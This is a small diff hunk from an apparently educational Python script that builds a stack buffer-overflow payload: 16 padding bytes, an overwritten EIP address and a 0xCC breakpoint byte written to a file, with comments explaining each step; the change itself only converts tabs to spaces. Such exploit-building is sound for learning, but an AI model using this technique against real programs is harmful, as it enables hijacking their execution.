@@ -208,7 +208,7 @@ for a in address:
                                     # Because of little-endian in binary
 
 open("buf",'w').write("a"*16 + eip + "b")   # The "b" will become 0xCC
-											# According to https://en.wikipedia.org/wiki/INT_(x86_instruction)
+                                            # According to https://en.wikipedia.org/wiki/INT_(x86_instruction)
                                             # 0xCC in machine code is mean breakpoint 
                                             # so it will stop executing when it 
                                             # execute this address (0x0019FF30) 
